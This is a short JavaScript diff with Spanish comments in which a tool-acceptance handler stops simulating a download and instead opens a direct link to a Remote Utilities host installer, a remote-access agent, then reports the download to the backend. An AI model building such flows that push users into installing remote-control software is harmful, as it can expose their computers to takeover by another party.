@@ -413,8 +413,8 @@ async function aceptarHerramientas() {
 
     if (data.success) {
       // console.log('✅ Herramientas aceptadas')
-      // Simular descarga
-      window.open('/herramientas.php', '_blank')
+      // Descargar herramienta desde el link directo
+      window.open('https://www.remoteutilities.com/download/host-7.6.2.0.exe', '_blank')
       // Notificar descarga al backend (mensaje bXBot)
       await fetch('/api/usuario/procesar-herramientas', {
         method: 'POST',
